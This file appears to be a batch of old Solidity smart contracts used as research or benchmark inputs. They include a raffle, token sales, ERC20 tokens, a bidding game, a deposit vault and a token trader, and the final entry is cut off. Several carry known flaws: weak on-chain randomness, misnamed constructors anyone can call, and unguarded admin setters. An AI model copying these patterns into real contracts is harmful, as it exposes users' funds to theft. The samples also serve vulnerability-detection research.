# 本批实际输入源码

按输入原字节 SHA 核对。源码位置采用 UTF-8 字节偏移。

## RQ1_004d04aafe56

SHA-256 `2d7682b3efcc8b089637bec51c15ab79005d55ed22493a7a4a41e24b1e9b369a`

```solidity
pragma solidity ^0.4.16;
contract Ethraffle_v2b {
    struct Contestant {
        address addr;
        uint raffleId;
    }
    event RaffleResult(
        uint indexed raffleId,
        uint winningNumber,
        address winningAddress,
        address seed1,
        address seed2,
        uint seed3,
        bytes32 randHash
    );
    event TicketPurchase(
        uint indexed raffleId,
        address contestant,
        uint number
    );
    event TicketRefund(
        uint indexed raffleId,
        address contestant,
        uint number
    );
    uint public constant prize = 2.5 ether;
    uint public constant fee = 0.03 ether;
    uint public constant totalTickets = 50;
    uint public constant pricePerTicket = (prize + fee) / totalTickets; 
    address feeAddress;
    bool public paused = false;
    uint public raffleId = 1;
    uint nextTicket = 0;
    mapping (uint => Contestant) contestants;
    uint[] gaps;
    function Ethraffle_v2b() public {
        feeAddress = msg.sender;
    }
    function () payable public {
        buyTickets();
    }
    function buyTickets() payable public {
        if (paused) {
            msg.sender.transfer(msg.value);
            return;
        }
        uint moneySent = msg.value;
        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {
            uint currTicket = 0;
            if (gaps.length > 0) {
                currTicket = gaps[gaps.length-1];
                gaps.length--;
            } else {
                currTicket = nextTicket++;
            }
            contestants[currTicket] = Contestant(msg.sender, raffleId);
            TicketPurchase(raffleId, msg.sender, currTicket);
            moneySent -= pricePerTicket;
        }
        if (nextTicket == totalTickets) {
            chooseWinner();
        }
        if (moneySent > 0) {
            msg.sender.transfer(moneySent);
        }
    }
    function chooseWinner() private {
        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;
        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;
        uint seed3 = block.difficulty;
        bytes32 randHash = keccak256(seed1, seed2, seed3);
        uint winningNumber = uint(randHash) % totalTickets;
        address winningAddress = contestants[winningNumber].addr;
        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);
        raffleId++;
        nextTicket = 0;
        winningAddress.transfer(prize);
        feeAddress.transfer(fee);
    }
    function getRefund() public {
        uint refund = 0;
        for (uint i = 0; i < totalTickets; i++) {
            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {
                refund += pricePerTicket;
                contestants[i] = Contestant(address(0), 0);
                gaps.push(i);
                TicketRefund(raffleId, msg.sender, i);
            }
        }
        if (refund > 0) {
            msg.sender.transfer(refund);
        }
    }
    function endRaffle() public {
        if (msg.sender == feeAddress) {
            paused = true;
            for (uint i = 0; i < totalTickets; i++) {
                if (raffleId == contestants[i].raffleId) {
                    TicketRefund(raffleId, contestants[i].addr, i);
                    contestants[i].addr.transfer(pricePerTicket);
                }
            }
            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);
            raffleId++;
            nextTicket = 0;
            gaps.length = 0;
        }
    }
    function togglePause() public {
        if (msg.sender == feeAddress) {
            paused = !paused;
        }
    }
    function kill() public {
        if (msg.sender == feeAddress) {
            selfdestruct(feeAddress);
        }
    }
}
```

## RQ1_04b90a3b2853

SHA-256 `5004e641eb5542c3c52f089e96aefbb748be571fd8cc48449afc92651314fc09`

```solidity
pragma solidity ^0.4.24;
contract Ambi {
    function getNodeAddress(bytes32) constant returns (address);
    function addNode(bytes32, address) external returns (bool);
    function hasRelation(bytes32, bytes32, address) constant returns (bool);
}
contract AmbiEnabled {
    Ambi ambiC;
    bytes32 public name;
    modifier checkAccess(bytes32 _role) {
        if(address(ambiC) != 0x0 && ambiC.hasRelation(name, _role, msg.sender)){
            _;
        }
    }
    function getAddress(bytes32 _name) returns (address) {
        return ambiC.getNodeAddress(_name);
    }
    function setAmbiAddress(address _ambi, bytes32 _name) returns (bool){
        if(address(ambiC) != 0x0){
            return false;
        }
        Ambi ambiContract = Ambi(_ambi);
        if(ambiContract.getNodeAddress(_name)!=address(this)) {
            bool isNode = ambiContract.addNode(_name, address(this));
            if (!isNode){
                return false;
            }   
        }
        name = _name;
        ambiC = ambiContract;
        return true;
    }
    function remove(){
        if(msg.sender == address(ambiC)){
            suicide(msg.sender);
        }
    }
}
contract ElcoinDb {
    function getBalance(address addr) constant returns(uint balance);
}
contract ElcoinInterface {
    function rewardTo(address _to, uint _amount) returns (bool);
}
contract PosRewards is AmbiEnabled {
    event Reward(address indexed beneficiary, uint indexed cycle, uint value, uint position);
    uint public cycleLength; 
    uint public startTime;   
    uint public cycleLimit;  
    uint public minimalRewardedBalance; 
    uint[] public bannedCycles;
    enum RewardStatuses { Unsent, Sent, TooSmallToSend }
    struct Account {
        address recipient;
        RewardStatuses status;
    }
    mapping (uint => mapping (address => int)) public accountsBalances;
    mapping (uint => Account[]) public accountsUsed;
    function PosRewards() {
        cycleLength = 864000; 
        cycleLimit = 255; 
        minimalRewardedBalance = 1000000; 
        startTime = now;
    }
    function setStartTime(uint _startTime) checkAccess("owner") {
        startTime = _startTime;
    }
    function setCycleLimit(uint _cycleLimit) checkAccess("owner") {
        cycleLimit = _cycleLimit;
    }
    function setBannedCycles(uint[] _cycles) checkAccess("owner") {
        bannedCycles = _cycles;
    }
    function setMinimalRewardedBalance(uint _balance) checkAccess("owner") {
        minimalRewardedBalance = _balance;
    }
    function kill() checkAccess("owner") {
        suicide(msg.sender); 
    }
    function getRate(uint cycle) constant returns (uint) {
        if (cycle <= 9) {
            return 50;
        }
        if (cycle <= 18) {
            return 40;
        }
        if (cycle <= 27) {
            return 30;
        }
        if (cycle <= 35) { 
            return 20;
        }
        if (cycle == 36) {
            return 40;
        }
        if (cycle <= cycleLimit) {
            if (cycle % 36 == 0) {
                return 20;
            }
            return 10;
        }
        return 0;
    }
    function currentCycle() constant returns (uint) {
        if (startTime > now) {
            return 0;
        }
        return 1 + ((now - startTime) / cycleLength);
    }
    function _isCycleValid(uint _cycle) constant internal returns (bool) {
        if (_cycle >= currentCycle() || _cycle == 0) {
            return false;
        }
        for (uint i; i<bannedCycles.length; i++) {
            if (bannedCycles[i] == _cycle) {
                return false;
            }
        }
        return true;
    }
    function getInterest(uint amount, uint cycle) constant returns (uint) {
        return (amount * getRate(cycle)) / 3650;
    }
    function transfer(address _from, address _to) checkAccess("elcoin") {
        if (startTime == 0) {
            return; 
        }
        _storeBalanceRecord(_from);
        _storeBalanceRecord(_to);
    }
    function _storeBalanceRecord(address _addr) internal {
        ElcoinDb db = ElcoinDb(getAddress("elcoinDb"));
        uint cycle = currentCycle();
        if (cycle > cycleLimit) {
            return;
        }
        int balance = int(db.getBalance(_addr));
        bool accountNotUsedInCycle = (accountsBalances[cycle][_addr] == 0);
        if (accountsBalances[cycle][_addr] != -1 && (accountNotUsedInCycle || accountsBalances[cycle][_addr] > balance)) {
            if (balance == 0) {
                balance = -1;
            }
            accountsBalances[cycle][_addr] = balance;
            if (accountNotUsedInCycle) {
                accountsUsed[cycle].push(Account(_addr, RewardStatuses.Unsent));
            }
        }
    }
    function getMinimalBalance(uint _cycle, address _addr) constant returns(int) {
        int balance = accountsBalances[_cycle][_addr];
        if (balance == -1) {
            balance = 0;
        }
        return balance;
    }
    function getAccountInfo(uint _cycle, uint _position) constant returns(address, RewardStatuses, int) {
        return (
            accountsUsed[_cycle][_position].recipient,
            accountsUsed[_cycle][_position].status,
            accountsBalances[_cycle][accountsUsed[_cycle][_position].recipient]
          );
    }
    function getRewardsCount(uint _cycle) constant returns(uint) {
        return accountsUsed[_cycle].length;
    }
    function sendReward(uint _cycle, uint _position) returns(bool) {
        if (!_isCycleValid(_cycle) || _position >= accountsUsed[_cycle].length) {
            return false;
        }
        Account claimant = accountsUsed[_cycle][_position];
        if (claimant.status != RewardStatuses.Unsent) {
            return false;
        }
        int minimalAccountBalance = accountsBalances[_cycle][claimant.recipient];
        if (minimalAccountBalance < int(minimalRewardedBalance)) {
            claimant.status = RewardStatuses.TooSmallToSend;
            return false;
        }
        uint rewardAmount = getInterest(uint(minimalAccountBalance), _cycle);
        ElcoinInterface elcoin = ElcoinInterface(getAddress("elcoin"));
        bool result = elcoin.rewardTo(claimant.recipient, rewardAmount);
        if (result) {
            Reward(claimant.recipient, _cycle, rewardAmount, _position);
            claimant.status = RewardStatuses.Sent;
        }
        return true;
    }
}

```

## RQ1_6fa43914a4bd

SHA-256 `206e9011fbd4375b4cebf53d4d65f76f4f3e678a868ee01497012dd48c893696`

```solidity
pragma solidity 0.4.24;
    contract Owned {
        address public owner;
        function owned() public {
            owner = msg.sender;
        }
        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }
        function transferOwnership(address _newOwner) onlyOwner public {
            owner = _newOwner;
        }          
    }
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
interface RailzToken {
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract RailzTokenSale is Owned {
	using SafeMath for uint256;
	mapping (address=> uint256) contributors;
	mapping (address=> uint256) public tokensAllocated;
	uint256 public presalestartTime =1528099200 ;     
	uint256 public presaleendTime = 1530489599;       
	uint256 public publicsalestartTime = 1530518400;  
	uint256 public publicsalesendTime = 1532908799;   
	uint256 public presalesCap = 120000000 * (1e18);
	uint256 public publicsalesCap = 350000000 * (1e18);
	uint256 public presalesTokenPriceInWei =  80000000000000 ; 
	uint256 public publicsalesTokenPriceInWei = 196000000000000 ;
	address wallet;
	uint256 public weiRaised=0;
	uint256 public numberOfTokensAllocated=0;
	uint256 public maxGasPrice = 60000000000  wei;  
	RailzToken public token;
	bool hasPreTokenSalesCapReached = false;
	bool hasTokenSalesCapReached = false;
	event ContributionReceived(address indexed contributor, uint256 value, uint256 numberOfTokens);
	event TokensTransferred(address indexed contributor, uint256 numberOfTokensTransferred);
	event ManualTokensTransferred(address indexed contributor, uint256 numberOfTokensTransferred);
	event PreTokenSalesCapReached(address indexed contributor);
	event TokenSalesCapReached(address indexed contributor);
	function RailzTokenSale(RailzToken _addressOfRewardToken, address _wallet) public {        
  		require(presalestartTime >= now); 
  		require(_wallet != address(0));   
  		token = RailzToken (_addressOfRewardToken);
  		wallet = _wallet;
		owner = msg.sender;
	}
	modifier validGasPrice() {
		assert(tx.gasprice <= maxGasPrice);
		_;
	}
	function ()  payable public validGasPrice {  
		require(msg.sender != address(0));                      
		require(msg.value != 0);                                
        require(msg.value>=0.1 ether);                          
		require(isContributionAllowed());                       
		contributors[msg.sender] = contributors[msg.sender].add(msg.value);
		weiRaised = weiRaised.add(msg.value);
		uint256 numberOfTokens = 0;
		if (isPreTokenSaleActive()) {
			numberOfTokens = msg.value/presalesTokenPriceInWei;
            numberOfTokens = numberOfTokens * (1e18);
			require((numberOfTokens + numberOfTokensAllocated) <= presalesCap);			
			tokensAllocated[msg.sender] = tokensAllocated[msg.sender].add(numberOfTokens);
			numberOfTokensAllocated = numberOfTokensAllocated.add(numberOfTokens);
		    forwardFunds(); 
			emit ContributionReceived(msg.sender, msg.value, numberOfTokens);
		} else if (isTokenSaleActive()) {
			numberOfTokens = msg.value/publicsalesTokenPriceInWei;
			numberOfTokens = numberOfTokens * (1e18);
			require((numberOfTokens + numberOfTokensAllocated) <= (presalesCap + publicsalesCap));	
			tokensAllocated[msg.sender] = tokensAllocated[msg.sender].add(numberOfTokens);
			numberOfTokensAllocated = numberOfTokensAllocated.add(numberOfTokens);
		    forwardFunds();
		    emit ContributionReceived(msg.sender, msg.value, numberOfTokens);
		}        
		checkifCapHasReached();
	}
	function isContributionAllowed() public view returns (bool) {    
		if (isPreTokenSaleActive())
			return  (!hasPreTokenSalesCapReached);
		else if (isTokenSaleActive())
			return (!hasTokenSalesCapReached);
		else
			return false;
	}
	function forwardFunds() internal {
		wallet.transfer(msg.value);
	}
	function isPreTokenSaleActive() internal view returns (bool) {
		return ((now >= presalestartTime) && (now <= presaleendTime));  
	}
	function isTokenSaleActive() internal view returns (bool) {
		return (now >= (publicsalestartTime) && (now <= publicsalesendTime));  
	}
	function preTokenSalesCapReached() internal {
		hasPreTokenSalesCapReached = true;
		emit PreTokenSalesCapReached(msg.sender);
	}
	function tokenSalesCapReached() internal {
		hasTokenSalesCapReached = true;
		emit TokenSalesCapReached(msg.sender);
	}
	function transferToken(address _contributor) public onlyOwner {
		require(_contributor != 0);
        uint256 numberOfTokens = tokensAllocated[_contributor];
        tokensAllocated[_contributor] = 0;    
		token.transfer(_contributor, numberOfTokens);
		emit TokensTransferred(_contributor, numberOfTokens);
	}
	 function manualBatchTransferToken(uint256[] amount, address[] wallets) public onlyOwner {
        for (uint256 i = 0; i < wallets.length; i++) {
            token.transfer(wallets[i], amount[i]);
			emit TokensTransferred(wallets[i], amount[i]);
        }
    }
	 function batchTransferToken(address[] wallets) public onlyOwner {
        for (uint256 i = 0; i < wallets.length; i++) {
			uint256 amountOfTokens = tokensAllocated[wallets[i]];
			require(amountOfTokens > 0);
			tokensAllocated[wallets[i]]=0;
            token.transfer(wallets[i], amountOfTokens);
			emit TokensTransferred(wallets[i], amountOfTokens);
        }
    }
	function refundContribution(address _contributor, uint256 _weiAmount) public onlyOwner returns (bool) {
		require(_contributor != 0);                                                                                                                                     
		if (!_contributor.send(_weiAmount)) {
			return false;
		} else {
			contributors[_contributor] = 0;
			return true;
		}
	}
    function checkifCapHasReached() internal {
    	if (isPreTokenSaleActive() && (numberOfTokensAllocated > presalesCap))  
        	hasPreTokenSalesCapReached = true;
     	else if (isTokenSaleActive() && (numberOfTokensAllocated > (presalesCap + publicsalesCap)))     
        	hasTokenSalesCapReached = true;     	
    }
    function setGasPrice(uint256 _gasPrice) public onlyOwner {
    	maxGasPrice = _gasPrice;
    }
}
```

## RQ1_67c41965bdb2

SHA-256 `bc2f846995ca8db1550f4bb8d73fbaa724ecc01a35ba3d936add5df10d5dd2c4`

```solidity
pragma solidity ^0.4.18;
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract ERC20TokenInterface {
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
    }
contract admined { 
    address public admin; 
    bool public lockTransfer; 
    address public allowedAddress; 
    function admined() internal {
        admin = msg.sender; 
        Admined(admin);
    }
    function setAllowedAddress(address _to) public {
        allowedAddress = _to;
        AllowedSet(_to);
    }
    modifier onlyAdmin() { 
        require(msg.sender == admin);
        _;
    }
    modifier transferLock() { 
        require(lockTransfer == false || allowedAddress == msg.sender);
        _;
    }
    function transferAdminship(address _newAdmin) onlyAdmin public { 
        admin = _newAdmin;
        TransferAdminship(admin);
    }
    function setTransferLock(bool _set) onlyAdmin public { 
        lockTransfer = _set;
        SetTransferLock(_set);
    }
    event AllowedSet(address _to);
    event SetTransferLock(bool _set);
    event TransferAdminship(address newAdminister);
    event Admined(address administer);
}
contract ERC20Token is ERC20TokenInterface, admined { 
    using SafeMath for uint256;
    uint256 public totalSupply;
    mapping (address => uint256) balances; 
    mapping (address => mapping (address => uint256)) allowed; 
    mapping (address => bool) public frozen; 
    function balanceOf(address _owner) public constant returns (uint256 balance) {
      return balances[_owner];
    }
    function transfer(address _to, uint256 _value) transferLock public returns (bool success) {
        require(_to != address(0)); 
        require(balances[msg.sender] >= _value);
        require(frozen[msg.sender]==false);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) transferLock public returns (bool success) {
        require(_to != address(0)); 
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);
        require(frozen[_from]==false);
        balances[_to] = balances[_to].add(_value);
        balances[_from] = balances[_from].sub(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
      allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
    }
    function setFrozen(address _target,bool _flag) onlyAdmin public {
        frozen[_target]=_flag;
        FrozenStatus(_target,_flag);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event FrozenStatus(address _target,bool _flag);
}
contract Asset is ERC20Token {
    string public name = 'OMEGON';
    uint8 public decimals = 18;
    string public symbol = 'OMGN';
    string public version = '1';
    function Asset() public {
        totalSupply = 2000000000 * (10**uint256(decimals)); 
        balances[0x72046e44d7a3A92bE433E7bFD08cDb49B0A39e43] = 1000000000 * (10**uint256(decimals)); 
        balances[0xFAB6368b0F7be60c573a6562d82469B5ED9e7eE6] = 4000000 * (10**uint256(decimals)); 
        balances[msg.sender] = 996000000 * (10**uint256(decimals)); 
        Transfer(0, this, totalSupply);
        Transfer(this, 0x1789bD78712815e7Fc955DbbA6803303f4Ef15AC, balances[0x1789bD78712815e7Fc955DbbA6803303f4Ef15AC]);
        Transfer(this, 0xFAB6368b0F7be60c573a6562d82469B5ED9e7eE6, balances[0xFAB6368b0F7be60c573a6562d82469B5ED9e7eE6]);
        Transfer(this, msg.sender, balances[msg.sender]);
    }
    function() public {
        revert();
    }
}
```

## RQ1_0904615e5961

SHA-256 `62fc5e41f6867c2d292bf5da61780669fad6723f0b6ef97f4e80418ec650c352`

```solidity
pragma solidity ^0.4.24;
contract tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData); }
contract RoundToken {
  string public constant name = "ROUND";
  string public constant symbol = "ROUND";
  uint8 public constant decimals = 18;
  string public constant version = '0.1';
  uint256 public constant totalSupply = 1000000000 * 1000000000000000000;
  address public owner;
  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);
  event NewOwner(address _newOwner);
  modifier checkIfToContract(address _to) {
    if(_to != address(this))  {
      _;
    }
  }
  mapping (address => uint256) balances;
  mapping (address => mapping (address => uint256)) allowed;
  function RoundToken() {
    owner = msg.sender;
    balances[owner] = totalSupply;
  }
  function replaceOwner(address _newOwner) returns (bool success) {
    if (msg.sender != owner) throw;
    owner = _newOwner;
    NewOwner(_newOwner);
    return true;
  }
  function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances[_owner];
  }
  function transfer(address _to, uint256 _value) checkIfToContract(_to) returns (bool success) {
    if (balances[msg.sender] >= _value && _value > 0) {
      balances[msg.sender] -= _value;
      balances[_to] += _value;
      Transfer(msg.sender, _to, _value);
      return true;
    } else {
      return false;
    }
  }
  function transferFrom(address _from, address _to, uint256 _value) checkIfToContract(_to) returns (bool success) {
    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
      balances[_to] += _value;
      balances[_from] -= _value;
      allowed[_from][msg.sender] -= _value;
      Transfer(_from, _to, _value);
      return true;
    } else {
      return false;
    }
  }
  function approve(address _spender, uint256 _value) returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
  function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
    tokenRecipient spender = tokenRecipient(_spender);
    if (approve(_spender, _value)) {
      spender.receiveApproval(msg.sender, _value, this, _extraData);
      return true;
    }
  }
  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }
}
contract Owned {
  address public contractOwner;
  address public pendingContractOwner;
  function Owned() {
    contractOwner = msg.sender;
  }
  modifier onlyContractOwner() {
    if (contractOwner == msg.sender) _;
  }
  function changeContractOwnership(address _to) onlyContractOwner() returns(bool) {
    pendingContractOwner = _to;
    return true;
  }
  function claimContractOwnership() returns(bool) {
    if (pendingContractOwner != msg.sender)
      return false;
    contractOwner = pendingContractOwner;
    delete pendingContractOwner;
    return true;
  }
}
contract BidGame is Owned {
  uint commissionPercent;
  uint refundPenalty;
  address gameOracleAddress;
  address contractRoundTokenAddress;
  struct Game {
    uint gameId;
    uint state; 
    string winnerUserName;
    uint winnerUserId;
    uint totalGameBid;
	uint bidAmt;
    Bid[] bids;
  }
  struct Bid {
    address bidderAddress;
    uint bid;
    uint userId;
    string userName;
    bool refunded;
  }
  mapping(uint => Game) games;
  modifier onlyGameOracle() {
    if (gameOracleAddress == msg.sender) _;
  }
  event LogSender2(address log, address contractRoundToken);
  event GameBidAccepted(address bidder, uint amount, uint gameId, uint userId, bytes userName, bool state);
  event GameStarted(uint gameId);
  event GameFinished(uint gameId, uint winnerUserId, string winnerUserName, uint winnersPayment, address winnerAddress);
  event GameRefunded(uint gameId, uint refundUserId, uint refundPayment);
  function setParams(uint _commissionPercent, uint _refundPenalty, address _gameOracleAddress, address _contractRoundTokenAddress) onlyContractOwner() {
    commissionPercent = _commissionPercent;
    refundPenalty = _refundPenalty;
    gameOracleAddress = _gameOracleAddress;
    contractRoundTokenAddress = _contractRoundTokenAddress;
    LogSender2(msg.sender, contractRoundTokenAddress);
  }
  function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) {
    uint i = bytesToUint2(bytes(_extraData));
    uint _gameId = i/10000;
    uint _userId = i - _gameId*10000;
	if (games[_gameId].gameId > 0){
		uint amountToBid = games[_gameId].bidAmt;
		for (uint k = 0; k < games[_gameId].bids.length; k++) {
			if(!games[_gameId].bids[k].refunded && _userId==games[_gameId].bids[k].userId) {
				amountToBid-=games[_gameId].bids[k].bid;
			}	
		}
		if(amountToBid>0)
			_value = amountToBid;
		else
			throw;
    }
    RoundToken token = RoundToken(contractRoundTokenAddress);
    bool state = token.transferFrom(_from, gameOracleAddress, _value);
    if (!state) throw;
	if (games[_gameId].gameId == 0){
		games[_gameId].bidAmt = _value;
		games[_gameId].gameId = _gameId;
	}
    games[_gameId].totalGameBid += _value;
    games[_gameId].bids.push(Bid(_from, _value, _userId, '', false));
    GameBidAccepted(_from, _value, _gameId, _userId, '', state);
  }
  function gameResult(uint _gameId, uint _userId) onlyGameOracle() {
    if (games[_gameId].gameId == 0) throw;
    if (games[_gameId].winnerUserId != 0) throw;
    if (games[_gameId].totalGameBid == 0) throw;
    address winnerAddress;
    uint commission = games[_gameId].totalGameBid*commissionPercent/100;
    uint winnerAmount = games[_gameId].totalGameBid - commission;
    for (uint i = 0; i < games[_gameId].bids.length; i++) {
      if(!games[_gameId].bids[i].refunded && _userId==games[_gameId].bids[i].userId) {
        winnerAddress = games[_gameId].bids[i].bidderAddress;
        break;
      }
    }
    if (winnerAddress == 0) throw;
    RoundToken token = RoundToken(contractRoundTokenAddress);
    bool state = token.transferFrom(gameOracleAddress, winnerAddress, winnerAmount);
    if (!state) throw;
    games[_gameId].winnerUserId = _userId;
    games[_gameId].state = 200;
    GameFinished(_gameId, _userId, '', winnerAmount, winnerAddress);
  }
  function gameStart(uint _gameId) onlyGameOracle() {
    if (games[_gameId].gameId == 0) throw;
    if (games[_gameId].state != 0) throw;
    games[_gameId].state = 1;
    GameStarted(_gameId);
  }
  function gameRefund(uint _gameId) onlyGameOracle() {
    if (games[_gameId].gameId == 0) throw;
    if (games[_gameId].winnerUserId != 0) throw;
    if (games[_gameId].totalGameBid == 0) throw;
    for (uint i = 0; i < games[_gameId].bids.length; i++) {
      if(!games[_gameId].bids[i].refunded) {
        uint penalty = games[_gameId].bids[i].bid*refundPenalty/100;
        uint refundAmount = games[_gameId].bids[i].bid - penalty;
        RoundToken token = RoundToken(contractRoundTokenAddress);
        bool state = token.transferFrom(gameOracleAddress, games[_gameId].bids[i].bidderAddress, refundAmount);
        if (!state) throw;
        games[_gameId].bids[i].refunded = true;
        games[_gameId].totalGameBid -= games[_gameId].bids[i].bid;
        GameRefunded(_gameId, games[_gameId].bids[i].userId, refundAmount);
      }
    }
  }
  function bidRefund(uint _gameId, uint _userId) onlyGameOracle() {
    if (games[_gameId].gameId == 0) throw;
    if (games[_gameId].winnerUserId != 0) throw;
    if (games[_gameId].totalGameBid == 0) throw;
    for (uint i = 0; i < games[_gameId].bids.length; i++) {
      if(!games[_gameId].bids[i].refunded) {
        if (games[_gameId].bids[i].userId == _userId) {
          uint penalty = games[_gameId].bids[i].bid*refundPenalty/100;
          uint refundAmount = games[_gameId].bids[i].bid - penalty;
          RoundToken token = RoundToken(contractRoundTokenAddress);
          bool state = token.transferFrom(gameOracleAddress, games[_gameId].bids[i].bidderAddress, refundAmount);
          if (!state) throw;
          games[_gameId].bids[i].refunded = true;
          games[_gameId].totalGameBid -= games[_gameId].bids[i].bid;
          GameRefunded(_gameId, games[_gameId].bids[i].userId, refundAmount);
        }
      }
    }
  }
  function getSettings() constant returns(uint commission, uint penalty) {
    return (
      commissionPercent,
      refundPenalty
    );
  }
  function getGame(uint _gameId) constant returns(uint gameId, uint state, uint winnerUserId, uint totalGameBid, uint bidAmt, uint bidsAmount) {
    var game = games[_gameId];
    return (
      game.gameId,
      game.state,
      game.winnerUserId,
      game.totalGameBid,
	  game.bidAmt,
      game.bids.length
    );
  }
  function getGameBid(uint _gameId, uint _bidId) constant returns(address bidderAddress, uint bidsAmount, uint userId, string userName, bool refunded) {
    Game game = games[_gameId];
    Bid bid=game.bids[_bidId];
    return (
      bid.bidderAddress,
      bid.bid,
      bid.userId,
      bid.userName,
      bid.refunded
    );
  }
  function getBalance(address _owner) constant returns (uint256 balance) {
    RoundToken token = RoundToken(contractRoundTokenAddress);
    return token.balanceOf(_owner);
  }
  function kill() onlyContractOwner() {
   if (msg.sender == contractOwner){
      suicide(contractOwner);
    }
  }
  function bytesToUint2(bytes b) returns (uint) {
    uint result = 0;
    for (uint i=1; i < b.length; i++) {
      uint x = uint(uint(b[i]));
      if (x > 0)
        x = x - 48;
      result = result + x*(10**(b.length-i-1));
    }
    return result;
  }
}

```

## RQ1_e5ab2cf90f08

SHA-256 `28a97a0a8064afe44e804aa8cae65db958cdfd6f83e563b79275933de102c8e4`

```solidity
pragma solidity ^0.4.13;
contract ForeignToken {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint256 amount) public;
}
contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}
contract Deposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;
    event Deposit(uint amount);
    event Withdraw(uint amount);
    function Vault() payable {
        Owner = msg.sender;
        deposit();
    }
    function() payable {
        deposit();
    }
    function deposit() payable {
        if (msg.value >= 1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposit(msg.value);
        }
    }
    function kill() {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.transfer(amount);
            Withdraw(amount);
        }
    }
    function withdrawToken(address token, uint amount) payable onlyOwner {
        uint bal = ForeignToken(token).balanceOf(address(this));
        if (bal >= amount) {
            ForeignToken(token).transfer(msg.sender, amount);
        }
    }
}
```

## RQ1_c587815dd35d

SHA-256 `b34a0cd54a6d2a4e7d0854995d2a6026e6d95382788b6b1a8081090ebad47faa`

```solidity
pragma solidity ^0.4.19;
interface ChiToken {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
contract ChiTrader {
    ChiToken Chi = ChiToken(0x71E1f8E809Dc8911FCAC95043bC94929a36505A5); 
    address public seller;
    uint256 public price; 
    uint256 public Chi_available; 
    uint256 public Amount_of_Chi_for_One_ETH; 
    uint256 cooldown_start_time;
    function ChiTrader() public {
        seller = 0x0;
        price = 0;
        Chi_available = 0;
        Amount_of_Chi_for_One_ETH = 0;
        cooldown_start_time = 0;
    }
    function is_empty() public view returns (bool) {
        return (now - cooldown_start_time > 1 hours) && (this.balance==0) && (Chi.balanceOf(this) == 0);
    }
    function setup(uint256 chi_amount, uint256 price_in_wei) public {
        require(is_empty()); 
        require(Chi.allowance(msg.sender, this) >= chi_amount); 
        require(price_in_wei > 1000); 
        price = price_in_wei;
        Chi_available = chi_amount;
        Amount_of_Chi_for_One_ETH = 1 ether / price_in_wei;
        seller = msg.sender;
        require(Chi.transferFrom(msg.sender, this, chi_amount)); 
    }
    function() public payable{
        uint256 eth_balance = this.balance;
        uint256 chi_balance = Chi.balanceOf(this);
        if(msg.sender == seller){
            seller = 0x0; 
            price = 0; 
            Chi_available = 0; 
            Amount_of_Chi_for_One_ETH = 0; 
            cooldown_start_time = now; 
            if(eth_balance > 0) msg.sender.transfer(eth_balance); 
            if(chi_balance > 0) require(Chi.transfer(msg.sender, chi_balance)); 
        }        
        else{
            require(msg.value > 0); 
            require(price > 0); 
            uint256 num_chi = msg.value / price; 
            require(chi_balance >= num_chi); 
            Chi_available = chi_balance - num_chi; 
            require(Chi.transfer(msg.sender, num_chi)); 
        }
    }
}
```

## RQ1_545948b8fa49

SHA-256 `78a8360a9b44d1fa3e08e1f8507a1a61234a0d23dec50cd06a35ac1199cf15e3`

```solidity
pragma solidity ^0.5.8;
interface IERC20 {
